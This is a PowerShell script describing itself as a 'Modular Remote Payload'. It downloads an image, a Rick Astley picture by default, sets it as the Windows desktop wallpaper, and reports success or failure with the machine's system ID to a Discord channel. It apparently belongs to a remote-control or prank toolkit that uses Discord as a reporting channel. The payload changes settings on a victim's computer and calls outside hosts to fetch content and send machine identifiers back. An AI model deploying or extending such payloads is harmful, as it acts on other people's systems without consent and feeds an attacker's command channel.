# ============================================================
# Wallpaper Changer for Windows - Modular Remote Payload
# ============================================================

$sysid = Get-SystemID

# Default image (Rick Astley)
$imageUrl = if ($env:U) { $env:U } else { "https://i.imgur.com/LMGqCLV.jpeg" }
$wallpaperPath = "$env:TEMP\wallpaper_$(Get-Date -Format 'yyyyMMddHHmmss').jpg"

# Download image
try {
    Invoke-WebRequest -Uri $imageUrl -OutFile $wallpaperPath -UseBasicParsing
} catch {
    (New-Object Net.WebClient).DownloadFile($imageUrl, $wallpaperPath)
}

if (Test-Path $wallpaperPath) {
    # Set wallpaper using SystemParametersInfo
    Add-Type -TypeDefinition @"
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
    
    [Wallpaper]::SystemParametersInfo(20, 0, $wallpaperPath, 3)
    
    Send-Discord "🖼️ **Wallpaper Changed on $sysid**"
} else {
    Send-Discord "❌ Wallpaper download failed on $sysid"
}
